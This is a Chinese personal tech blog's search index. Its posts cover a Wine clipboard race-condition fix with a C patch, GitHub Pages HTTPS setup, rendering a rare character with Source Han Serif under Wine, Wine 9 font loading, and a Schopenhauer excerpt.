<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【Linux技术分享】wine下处理快速复制时偶现失败问题</title>
    <url>/2025/05/27/wine-%E5%A4%84%E7%90%86%E5%BF%AB%E9%80%9F%E5%A4%8D%E5%88%B6%E6%97%B6%E5%81%B6%E7%8E%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="某应用在在快速调用剪切板进行数据复制时，在第一次进行交互出现失败概率几乎为百分之百，后续点击交互失败概率大致为百分之20左右"><a href="#某应用在在快速调用剪切板进行数据复制时，在第一次进行交互出现失败概率几乎为百分之百，后续点击交互失败概率大致为百分之20左右" class="headerlink" title="某应用在在快速调用剪切板进行数据复制时，在第一次进行交互出现失败概率几乎为百分之百，后续点击交互失败概率大致为百分之20左右"></a>某应用在在快速调用剪切板进行数据复制时，在第一次进行交互出现失败概率几乎为百分之百，后续点击交互失败概率大致为百分之20左右</h1><span id="more"></span>

<h2 id="wine中的剪贴板理解"><a href="#wine中的剪贴板理解" class="headerlink" title="wine中的剪贴板理解"></a>wine中的剪贴板理解</h2><p><img src="/2025/05/27/wine-%E5%A4%84%E7%90%86%E5%BF%AB%E9%80%9F%E5%A4%8D%E5%88%B6%E6%97%B6%E5%81%B6%E7%8E%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/22.png" alt="图1"></p>
<p>在wine中剪贴板主要集中在两个模块，一个是user32,一个是winex11drv。</p>
<ol>
<li>winex11drv主要实现剪贴板相关逻辑，在destop窗口创建的时候会开启一个窗口名称叫做“__wine_clipboard_manager”的剪贴板管理器线程（x11代理窗口），该线程创建一个剪贴板管理窗口，并开启消息循环。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">TRACE( <span class="string">&quot;clipboard thread %04x running\n&quot;</span>, GetCurrentThreadId() );</span><br><span class="line"><span class="keyword">while</span> (GetMessageW( &amp;msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> )) DispatchMessageW( &amp;msg );</span><br></pre></td></tr></table></figure>

<p>在窗口消息处理回调函数处理剪贴板数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">case</span> WM_CLIPBOARDUPDATE:</span><br><span class="line"><span class="keyword">if</span> (EVENT_x11_time_to_win32_time(<span class="number">0</span>))</span><br><span class="line">          <span class="comment">/* ICCCM says don&#x27;t use CurrentTime, so try to use last message time if possibl*/</span></span><br><span class="line">   <span class="comment">/* <span class="doctag">FIXME:</span> this is not entirely correct*/</span></span><br><span class="line">    timestamp = GetMessageTime() - EVENT_x11_time_to_win32_time(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">           timestamp = CurrentTime;</span><br><span class="line">       <span class="keyword">if</span> (is_clipboard_owner) <span class="keyword">break</span>;  <span class="comment">/* ignore our own changes */</span></span><br><span class="line">       acquire_selection( thread_init_display() );</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> WM_RENDERFORMAT:</span><br><span class="line">       <span class="keyword">if</span> (render_format( wp )) rendered_formats++;</span><br></pre></td></tr></table></figure>

<p>当收到剪贴板数据变化的消息时，创建拥有剪贴板的窗口。当收到数据转换的消息时转换数据并调用opencliboard打开剪贴板，并设置对应数据到对应内存位置，关闭剪贴板。</p>
<p>而在收到窗口关闭消息时会创建剪贴板拥有窗口并得到剪贴板对应数据，然后调用X的事件循环，当有请求剪贴板数据时，发送对应数据到相应窗口。</p>
<ol start="2">
<li>user32中主要实现的是windows API相关接口，然后发送消息到winex11drv模块中处理。</li>
</ol>
<h2 id="问题详细分析"><a href="#问题详细分析" class="headerlink" title="问题详细分析"></a>问题详细分析</h2><ol>
<li><p>通过与应用厂商沟通，他们应用f2应用流程大致：用户在数据元模块中点击f2-&gt;数据拷贝至系统剪切板中-&gt;通过管道通知电子病例需要获取剪切板数据-&gt;电子病例获取剪切板数据并进行拷贝至目标窗口</p>
</li>
<li><p>通过wine下的代码学习，确认wine中的剪切板数据更新是在wineserver中同步所有剪切板的</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* notify all listeners, and return the viewer window that should be notified if any */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">user_handle_t</span> <span class="title">notify_listeners</span><span class="params">( struct clipboard *clipboard )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; clipboard-&gt;listen_count; i++)</span><br><span class="line">        post_message( clipboard-&gt;listeners[i], WM_CLIPBOARDUPDATE, <span class="number">0</span>, <span class="number">0</span> );</span><br><span class="line">    <span class="keyword">return</span> clipboard-&gt;viewer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>打开clipboard日志通道，发现剪切板的读取与写入在不同线程中执行，日志如下图，通过上一步的wine中剪切板数据同步代码学习，确认在同步时是需要进行wine中剪切板数据全部同步，包括需要同步至0x1003a（<code>\__wine_clipboard_manager</code>的剪贴板管理器），而同步时存在一定延迟性，该延迟就会导致该应用的剪切板读取偶尔出现无数据。<br><img src="/2025/05/27/wine-%E5%A4%84%E7%90%86%E5%BF%AB%E9%80%9F%E5%A4%8D%E5%88%B6%E6%97%B6%E5%81%B6%E7%8E%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/4.png" alt="图4"></p>
</li>
<li><p>从日志发现在剪切板的确将内容写入到<code>\__wine_clipboard_manager</code>的剪贴板管理器中<br><img src="/2025/05/27/wine-%E5%A4%84%E7%90%86%E5%BF%AB%E9%80%9F%E5%A4%8D%E5%88%B6%E6%97%B6%E5%81%B6%E7%8E%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/5.png" alt="图5"></p>
</li>
</ol>
<ol start="5">
<li><p>通过代码学习“__wine_clipboard_manager”剪切板为x11与wine下交互的中间工具，在desktop进程创建时进行创建，通过clipboard_thread线程进行管理。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">manage_desktop</span><span class="params">( WCHAR *arg )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UuidCreate( &amp;guid );</span><br><span class="line">    TRACE( <span class="string">&quot;display guid %s\n&quot;</span>, debugstr_guid(&amp;guid) );</span><br><span class="line">    graphics_driver = load_graphics_driver( driver, &amp;guid );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create the desktop window */</span></span><br><span class="line">    hwnd = CreateWindowExW( <span class="number">0</span>, DESKTOP_CLASS_ATOM, <span class="literal">NULL</span>,</span><br><span class="line">                            WS_POPUP | WS_CLIPSIBLINGS | WS_CLIPCHILDREN, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;guid );</span><br><span class="line">    ......</span><br><span class="line">        thread = CreateThread( <span class="literal">NULL</span>, <span class="number">0</span>, clipboard_thread, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;id );</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>在日志中定位与wine代码学习中确认wine中将剪切板内容写入到“__wine_clipboard_manager”窗口中时是跨进程操作，而window下的读取速度较快，在第一次写入时还需要注册剪切板部分内容，所以导致第一次失败概率较高，注册日志如下：<br><img src="/2025/05/27/wine-%E5%A4%84%E7%90%86%E5%BF%AB%E9%80%9F%E5%A4%8D%E5%88%B6%E6%97%B6%E5%81%B6%E7%8E%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/3.png" alt="图3"></p>
</li>
<li><p>从日志发现，该应用调用NtUserGetClipboardData函数获取剪切板数据时，是通过获取0x1003a（<code>\__wine_clipboard_manager</code>的剪贴板管理器）窗口剪切板进行数据获取的，从而也印证了，若同步时存在一定延迟性，该延迟就会导致该应用的剪切板读取偶尔出现无数据。<br><img src="/2025/05/27/wine-%E5%A4%84%E7%90%86%E5%BF%AB%E9%80%9F%E5%A4%8D%E5%88%B6%E6%97%B6%E5%81%B6%E7%8E%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/7.png" alt="图7"></p>
</li>
</ol>
<h2 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h2><p>问题原因：在wine中使用剪切板时需要考虑内容是否拷贝至非wine下进程窗口中。在x11下，wine是在desktop进程创建时，<br>创建了“__wine_clipboard_manager”窗口用于管理wine与x11窗口剪切板的交互，具体流程是在数据拷贝时，把拷贝内容转发至“__wine_clipboard_manager”窗口<br>，再将内容写入x11剪切板中，并且在第一次内容写入时进行消息注册，由于消息转发是跨进程操作存在消息异步问题，会导致剪切板数据更新不及时，使电子病例的引用第一次大概率失败，后续偶现失败，出问题时交互如下图：<br><img src="/2025/05/27/wine-%E5%A4%84%E7%90%86%E5%BF%AB%E9%80%9F%E5%A4%8D%E5%88%B6%E6%97%B6%E5%81%B6%E7%8E%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/11.png" alt="图11"></p>
<h2 id="修改方案"><a href="#修改方案" class="headerlink" title="修改方案"></a>修改方案</h2><ol>
<li><p>根据上述流程分析发现是与“__wine_clipboard_manager”窗口延迟导致该问题，目前在点击f2引用时只与wine中进程进行交互，修改方向就是点击f2时将与x11下剪切板管理工具交互逻辑进行屏蔽</p>
</li>
<li><p>增加WM_DISABLECLIPBOARD消息，当用户点击引用时，发送该消息至“__wine_clipboard_manager”窗口，将该窗口的x11下剪切板更新逻辑进行屏蔽，部分代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@@ <span class="number">-2257</span>,<span class="number">6</span> +<span class="number">2257</span>,<span class="number">10</span> @@ <span class="function">LRESULT <span class="title">X11DRV_ClipboardWindowProc</span><span class="params">( HWND hwnd, UINT msg, WPARAM wparam, LPARAM l</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">case</span> WM_NCCREATE:</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">return</span> clipboard_init( hwnd );</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">case</span> WM_CLIPBOARDUPDATE:</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">if</span>(theEMRClickQuote)&#123;</span></span></span><br><span class="line"><span class="function"><span class="params">+            theEMRClickQuote = FALSE;</span></span></span><br><span class="line"><span class="function"><span class="params">+            <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">+        &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">if</span> (is_clipboard_owner) <span class="keyword">break</span>;  <span class="comment">/* ignore our own changes */</span></span></span></span><br><span class="line"><span class="function"><span class="params">         acquire_selection( thread_init_display() );</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">@@ <span class="number">-2267</span>,<span class="number">9</span> +<span class="number">2271</span>,<span class="number">13</span> @@ LRESULT X11DRV_ClipboardWindowProc( HWND hwnd, UINT msg, WPARAM wparam, LPARAM l</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">if</span> (!is_clipboard_owner) <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">         request_selection_contents( thread_display(), FALSE );</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">+    <span class="keyword">case</span> WM_DISABLECLIPBOARD:</span></span></span><br><span class="line"><span class="function"><span class="params">+        theEMRClickQuote = TRUE;</span></span></span><br><span class="line"><span class="function"><span class="params">+        TRACE(<span class="string">&quot;WM_DISABLECLIPBOARD: disable x11 cliboard\n&quot;</span>);</span></span></span><br><span class="line"><span class="function"><span class="params">+        <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">case</span> WM_DESTROYCLIPBOARD:</span></span></span><br><span class="line"><span class="function"><span class="params">         TRACE( <span class="string">&quot;WM_DESTROYCLIPBOARD: lost ownership\n&quot;</span> );</span></span></span><br><span class="line"><span class="function"><span class="params">+        is_clipboard_owner = FALSE;</span></span></span><br><span class="line"><span class="function"><span class="params">         NtUserKillTimer( hwnd, <span class="number">1</span> );</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">     &#125;</span></span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>wine</category>
      </categories>
      <tags>
        <tag>wine</tag>
      </tags>
  </entry>
  <entry>
    <title>【问题解决】博客的https红锁解决</title>
    <url>/2025/04/27/blog%E7%9A%84https%E7%BA%A2%E9%94%81%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[<h1 id="blog的搭建"><a href="#blog的搭建" class="headerlink" title="blog的搭建"></a>blog的搭建</h1><p><em><strong>此博客是github+hexo，域名是通过腾讯云申请。</strong></em></p>
<span id="more"></span>

<p><strong>使用cloudflare进行反向代理也可以解决红锁问题，但是为中转方案存在部分问题</strong></p>
<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ol>
<li><p>在腾讯云申请免费的域名证书，有效期为90天<br><img src="/2025/04/27/blog%E7%9A%84https%E7%BA%A2%E9%94%81%E8%A7%A3%E5%86%B3/1.png" alt="图1"></p>
</li>
<li><p>选择手动dns验证<br><img src="/2025/04/27/blog%E7%9A%84https%E7%BA%A2%E9%94%81%E8%A7%A3%E5%86%B3/2.png" alt="图2"></p>
</li>
<li><p>手动添加一条解析<br><img src="/2025/04/27/blog%E7%9A%84https%E7%BA%A2%E9%94%81%E8%A7%A3%E5%86%B3/3.png" alt="图3"></p>
</li>
<li><p>添加完成后进行证书验证</p>
</li>
<li><p>在github的设置界面勾选<code>Enforce HTTPS</code><br><img src="/2025/04/27/blog%E7%9A%84https%E7%BA%A2%E9%94%81%E8%A7%A3%E5%86%B3/4.png" alt="图4"></p>
</li>
</ol>
<p>注意：勾选的时候若显示：<code>Unavailable for your site because your domain is not properly configured to support HTTPS</code>，则在腾讯云的域名解析增加以下解析，参考<a href="https://github.com/orgs/community/discussions/23049">https://github.com/orgs/community/discussions/23049</a></p>
<ul>
<li>185.199.108.153</li>
<li>185.199.109.153</li>
<li>185.199.110.153</li>
<li>185.199.111.153<br><img src="/2025/04/27/blog%E7%9A%84https%E7%BA%A2%E9%94%81%E8%A7%A3%E5%86%B3/5.png" alt="图5"></li>
</ul>
<ol start="6">
<li>最终效果如下图：</li>
</ol>
<p><img src="/2025/04/27/blog%E7%9A%84https%E7%BA%A2%E9%94%81%E8%A7%A3%E5%86%B3/10.png" alt="图10"></p>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】 关于使用思源宋体显示生僻字&#39;䶮&#39;调研报告</title>
    <url>/2025/04/10/wine-%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8%E6%80%9D%E6%BA%90%E5%AE%8B%E4%BD%93%E6%98%BE%E7%A4%BA%E7%94%9F%E5%83%BB%E5%AD%97%E4%B6%AE%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<h1 id="关于使用思源宋体显示生僻字’䶮’调研报告"><a href="#关于使用思源宋体显示生僻字’䶮’调研报告" class="headerlink" title="关于使用思源宋体显示生僻字’䶮’调研报告"></a>关于使用思源宋体显示生僻字’䶮’调研报告</h1><span id="more"></span>
<h2 id="调研目标"><a href="#调研目标" class="headerlink" title="调研目标"></a>调研目标</h2><p>在病案管理系统中使用思源宋体来替代宋体进行应用中的中文显示，并调研生僻字显示逻辑，能够使用思源宋体显示生僻字’䶮’，文档内容按照两步执行，第一步是将生僻字加载至思源宋体中，第二步是将系统宋体替换为思源宋体。</p>
<h2 id="应用现状"><a href="#应用现状" class="headerlink" title="应用现状"></a>应用现状</h2><p>当前应用界面中文显示使用为字体为<code>宋体</code>，在应用最初版本中无法显示生僻字’䶮’，在与北京同事协助下，通过对系统中宋体的字体文件进行修改后可以显示目标字体。</p>
<p>初始版本宋体无法显示如下图：<br><img src="/2025/04/10/wine-%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8%E6%80%9D%E6%BA%90%E5%AE%8B%E4%BD%93%E6%98%BE%E7%A4%BA%E7%94%9F%E5%83%BB%E5%AD%97%E4%B6%AE%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/1.png" alt="图1"></p>
<p>北京同事提供宋体文件修改后正常显示如下图：<br><img src="/2025/04/10/wine-%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8%E6%80%9D%E6%BA%90%E5%AE%8B%E4%BD%93%E6%98%BE%E7%A4%BA%E7%94%9F%E5%83%BB%E5%AD%97%E4%B6%AE%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/2.png" alt="图2"></p>
<p><em><strong>调研测试环境为：</strong></em></p>
<p><em>软件环境</em>：amd架构，nfs-5.0-G212p版本</p>
<p><em>硬件环境</em>：需要amd架构处理器</p>
<p><em>wine版本</em>：上游wine-8.6</p>
<p><em>容器应用</em>：病案管理系统</p>
<h2 id="设置思源宋体"><a href="#设置思源宋体" class="headerlink" title="设置思源宋体"></a>设置思源宋体</h2><ol>
<li>思源宋体可以从官网下载，<a href="https://source.typekit.com/source-han-serif/cn/%EF%BC%8C%E4%B8%8B%E8%BD%BD%E4%B9%8B%E5%90%8E%E5%BE%88%E5%A4%9A%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E5%A6%82%E4%B8%8B%EF%BC%9A">https://source.typekit.com/source-han-serif/cn/，下载之后很多文件夹，如下：</a><br><img src="/2025/04/10/wine-%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8%E6%80%9D%E6%BA%90%E5%AE%8B%E4%BD%93%E6%98%BE%E7%A4%BA%E7%94%9F%E5%83%BB%E5%AD%97%E4%B6%AE%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/3.png" alt="图3"></li>
</ol>
<p>QA：在wine下我使用 otc下无法识别，这个跟wine的读取字体实现有关系，系统是可以正常使用这个字体的，但是wine下只能识别otf,关于这个细节差距我会在《wine下字体模块实现调研》详细说明，这里就不再赘述</p>
<ol start="2">
<li>从官网下载的思源宋体中取出<code>SourceHanSerifSC-Regular.otf</code>字体文件，现需获取’䶮’在wine中的编码并将此字体文件的编码设置此生僻字，在wine中开启font的通道，过滤日志读取生僻字’䶮’的UTF16编码为0xE0FA<br><img src="/2025/04/10/wine-%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8%E6%80%9D%E6%BA%90%E5%AE%8B%E4%BD%93%E6%98%BE%E7%A4%BA%E7%94%9F%E5%83%BB%E5%AD%97%E4%B6%AE%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/4.png" alt="图4"></li>
</ol>
<ol start="3">
<li>网上对于字体编辑常用的两个工具，一个是开源的fontforge（多平台并免费），fontcreator（仅支持windonw并收费但容易上手），由于是实验阶段我就使用fontcreator工具，将目标字体打开<code>SourceHanSerifSC-Regular.otf</code>，搜索后发现’䶮’编码为0xE863，使用工具中的insert功能，设置编码0xE0FA为’䶮’字并导出字体文件。<br><img src="/2025/04/10/wine-%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8%E6%80%9D%E6%BA%90%E5%AE%8B%E4%BD%93%E6%98%BE%E7%A4%BA%E7%94%9F%E5%83%BB%E5%AD%97%E4%B6%AE%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/5.png" alt="图5"></li>
</ol>
<p><img src="/2025/04/10/wine-%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8%E6%80%9D%E6%BA%90%E5%AE%8B%E4%BD%93%E6%98%BE%E7%A4%BA%E7%94%9F%E5%83%BB%E5%AD%97%E4%B6%AE%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/12.png"></p>
<h2 id="设置wine注册表进行字体加载"><a href="#设置wine注册表进行字体加载" class="headerlink" title="设置wine注册表进行字体加载"></a>设置wine注册表进行字体加载</h2><ol>
<li><p>wine的字体加载有多种路径大致分为四种</p>
<ol>
<li>通过系统注册表中的指定路径</li>
<li>加载容器下的window/fonts路径字体</li>
<li>加载系统中的已存在字体</li>
<li>加载wine打包中的字体</li>
</ol>
</li>
<li><p>为了不影响系统下显示方便字体设置，修改容器下注册表<code>HKEY_CURRENT_USER\Software\Wine\Fonts</code>，增加加载字体路径，并把思源宋体字体放在目标路径下，火锅的字体wfont也存放在此文件夹<br><img src="/2025/04/10/wine-%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8%E6%80%9D%E6%BA%90%E5%AE%8B%E4%BD%93%E6%98%BE%E7%A4%BA%E7%94%9F%E5%83%BB%E5%AD%97%E4%B6%AE%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/6.png" alt="图6"></p>
</li>
<li><p>在容器应用启动后发现容器已加载目标字体<code>思源宋体</code><br><img src="/2025/04/10/wine-%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8%E6%80%9D%E6%BA%90%E5%AE%8B%E4%BD%93%E6%98%BE%E7%A4%BA%E7%94%9F%E5%83%BB%E5%AD%97%E4%B6%AE%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/7.png" alt="图7"></p>
</li>
</ol>
<ol start="4">
<li><p>需要修改系统注册表，将系统的宋体全部替换为<code>思源宋体</code>，注册表路径为HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\FontSubstitutes<br><img src="/2025/04/10/wine-%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8%E6%80%9D%E6%BA%90%E5%AE%8B%E4%BD%93%E6%98%BE%E7%A4%BA%E7%94%9F%E5%83%BB%E5%AD%97%E4%B6%AE%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/9.png" alt="图9"></p>
</li>
<li><p>显示现象如下<br><img src="/2025/04/10/wine-%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8%E6%80%9D%E6%BA%90%E5%AE%8B%E4%BD%93%E6%98%BE%E7%A4%BA%E7%94%9F%E5%83%BB%E5%AD%97%E4%B6%AE%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/10.png" alt="图10"></p>
</li>
</ol>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>wine下的字体显示是通过匹配度进行匹配的，在实际应用匹配时，思源字体与宋体差异度较大暂无法直接匹配上，需要通过注册表修改进行替换。在修改后也无法像原版宋体一样显示，但在字体官网展示对比中，宋体与思源宋体显示差异并不大，此方向需要继续调研，猜测宋体与思源宋体中的字体文件内容差距较大，列如字体衬线，宽度比例等导致。</p>
]]></content>
      <categories>
        <category>wine</category>
      </categories>
      <tags>
        <tag>wine</tag>
      </tags>
  </entry>
  <entry>
    <title>【读书有感】摘抄叔本华《爱与生活的苦恼》</title>
    <url>/2025/03/12/%E8%AF%BB%E7%88%B1%E4%B8%8E%E7%94%9F%E6%B4%BB%E7%9A%84%E8%8B%A6%E6%81%BC/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><em><strong>爱情的主要目的，不是爱的交流，而是相互占有，即肉体的享乐。纯洁的爱若脱离肉体的爱，是无法维持和保存的。落到这般境地，人多半是以自杀了却一生。</strong></em></p>
<span id="more"></span>

<ul>
<li>众所周知，幸福的婚姻并不多，因为结婚的本质，其目的并不为现在的当事者，而是为未出世的儿女着想。但性爱若附加上“性向一致”的友情–虽然不多见–也可缔结真正白首偕老的夫妻，这是从完全不同的根源所产生的感情，双方以最柔和的心情，互相慰藉。然而它的发生几乎都在性爱获得满足而消失之后才表现出来。性爱的发生，是男女以未来的第二代为主要着眼点，在肉体、智慧、道德方面取得互相弥补和适应，幸福的婚姻则要加上精神特性的调和。</li>
</ul>
]]></content>
      <categories>
        <category>阅读</category>
      </categories>
      <tags>
        <tag>读书有感</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】wine9下的字体加载显示学习</title>
    <url>/2025/02/17/wine-wine9%E4%B8%8B%E7%9A%84%E5%AD%97%E4%BD%93%E5%8A%A0%E8%BD%BD%E6%98%BE%E7%A4%BA%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="wine9下的字体加载显示学习"><a href="#wine9下的字体加载显示学习" class="headerlink" title="wine9下的字体加载显示学习"></a>wine9下的字体加载显示学习</h1><span id="more"></span>

<h1 id="字体与字形"><a href="#字体与字形" class="headerlink" title="字体与字形"></a>字体与字形</h1><p>字符的图像称为字形（glyphs），而一个字符可以有多个字形。而一个字形，也可用于多个字符（不同的字符，写法可能一样）。</p>
<p>我们可以只关注两个概念：</p>
<ol>
<li><p>一个字体文件包含多个字形，每一个都可以储存为位图、矢量、或其他任何方案。而我们通过字形索引访问。</p>
</li>
<li><p>字体文件包含一到多个表，称为字符表（character maps）。它可以将字符编码（ASCII、Unicode、GB2312、BIG5等）转为字形索引。（通过字形索引就能获取到字形，便可获得字符的图像）</p>
</li>
</ol>
<h1 id="字形"><a href="#字形" class="headerlink" title="字形"></a>字形</h1><h2 id="衬线（Serif"><a href="#衬线（Serif" class="headerlink" title="衬线（Serif)"></a>衬线（Serif)</h2><p>一些字体中的字母笔画首尾具有装饰性的细节，称为衬线。具有衬线的字体称为衬线体，不具有衬线的字体称为无衬线体。(“衬线体”是用于欧洲文字字体的纯粹装饰性特征，而阿拉伯语或东亚文字中使用的字形具有在某些方面可能相似的特征（例如笔画宽度），但不能称为衬线。)</p>
<h2 id="宽度比例（Proportion）"><a href="#宽度比例（Proportion）" class="headerlink" title="宽度比例（Proportion）"></a>宽度比例（Proportion）</h2><p>比例字体（proportional typeface）字形的宽度富有变化，等宽字体（定宽字体）中的字形具有相同的宽度。一些字体中，西文字母为等宽，而符号和汉字等正好是西文的两倍宽这类字体称为duospaced字体，在中文语境下往往也被称作等宽字体。</p>
<h2 id="字体度量（Metric）"><a href="#字体度量（Metric）" class="headerlink" title="字体度量（Metric）"></a>字体度量（Metric）</h2><p>对于拉丁字母、希腊字母、西里尔字母等西文字母，基线（Baseline）指的是多数字母排列的基准线，通常为 n, x, h 等字母的下沿所在的横线。x, u, w 等字母上沿所在的横线称为主线（mean line），其与基线距离称为x字高（x-height）。基线以下的垂直空间称为降部（descender）；主线到以上的垂直空间称为升部（ascender）。一些字母的变音符号位于降部和升部中。升部高度与x字高的比例会对字体的可读性和外观影响很大，并常常用于表征某一字体。</p>
<h1 id="linux下字体"><a href="#linux下字体" class="headerlink" title="linux下字体"></a>linux下字体</h1><h2 id="系统中的默认字体"><a href="#系统中的默认字体" class="headerlink" title="系统中的默认字体"></a>系统中的默认字体</h2><p>比如我系统中的默认”Noto Sans CJK TC” 字体，用于支持中文（简体和繁体）、日文和韩文字符的显示。它是 Google 公司开发的 Noto 字体系列的一部分，旨在提供跨多个东亚语言的一致字体支持。</p>
<ol>
<li>“Noto Sans CJK TC” 中的 “Noto” 是“No Tofu”的简称。在部分缺失某些字体的Windows、Linux等系统中，无法显示的字符会变成方块“□”，一般惯称为“tofu”，即“豆腐”之意。因此Noto的开发宗旨即为消除所有无法显示的字符，实现“No tofu”的目标。</li>
<li>“Sans” 表示这是一种无衬线字体（Sans-serif），即字母没有额外的装饰线条。</li>
<li>“CJK” 是一个缩写，代表中文（Chinese）、日文（Japanese）和韩文（Korean）。</li>
<li>“TC” 是 “Traditional Chinese” 的缩写，表示该字体主要用于显示繁体中文字符。<br>因此，”Noto Sans CJK TC” 是一种无衬线字体，专为支持中文、日文和韩文的显示而设计，特别适用于繁体中文。它是一个开源字体，可用于各种平台和应用程序，以确保东亚语言字符的正确显示和一致性。</li>
</ol>
<h2 id="linux字体加载"><a href="#linux字体加载" class="headerlink" title="linux字体加载"></a>linux字体加载</h2><h3 id="简单的一次字体加载"><a href="#简单的一次字体加载" class="headerlink" title="简单的一次字体加载"></a>简单的一次字体加载</h3><p>Linux桌面程序使fontconfig控制字体，当我们给桌面程序设置字体后，桌面程序会以font pattern（用于描述字体属性和信息的数据结构）的形式将设置传递给fontconfig，fontconfig会按照自身配置的规则对这个font pattern进行修改，输出返回结果给桌面程序，然后桌面程序就知道该系统使用的字体，并通过 FreeType 等渲染引擎绘制文字。</p>
<p>增加font的日志启动一个x11客户端，观察linux字体的简单加载流程。</p>
<ul>
<li>FC_DEBUG=4  <code>wine应用</code> &amp;&gt;./1.txt</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FcConfigSubstitute Pattern has 2 elts (size 16)</span><br><span class="line">	lang: &quot;zh-CN&quot;(w)</span><br><span class="line">	prgname: &quot;wine-preloader&quot;(s)</span><br></pre></td></tr></table></figure>
<ol>
<li>在wine启动wine-preloader时，传递给 fontconfig 的 font pattern 有 2 个元素 (elts)，其中 family 的值， lang就是传入的语言，prgname则是进程名称，因为这里的通过wine-preloader加载的其他应用所以只能看到这个一个单个进程</li>
</ol>
